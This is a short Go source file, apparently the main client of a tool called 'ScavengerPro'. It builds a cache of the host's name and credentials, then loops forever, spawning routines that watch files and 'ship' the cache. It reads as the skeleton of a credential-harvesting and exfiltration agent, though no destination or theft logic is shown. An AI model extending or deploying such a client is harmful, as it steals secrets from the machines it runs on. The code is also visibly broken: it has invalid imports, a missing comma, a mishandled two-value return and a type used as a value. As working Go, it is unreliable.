package main
//import "ScavengerPro/client/cred_cache"
import "ScavengerPro/client/file_watch.go"
import "ScavengerPro/client/shipper.go"

import "fmt"
import "time"
import "os"

func watch(files []string, c cred_cache.CredCache){
	fmt.Println("watching")
	check_files(files)
}

func ship(c cred_cache.CredCache, min int){
	fmt.Println("shipping")
	ship_it(c, min)

}

func main(){
	files := []string{"filepath:type" "file2:type"}
	min := 5
	h := os.Hostname()

	c := cred_cache.CredCache {
		Hostname: h,
		Credentials: []string,
	}
	for{
		time.Sleep(2)
		go watch(files, c)
		go ship(c, min)
	}
}
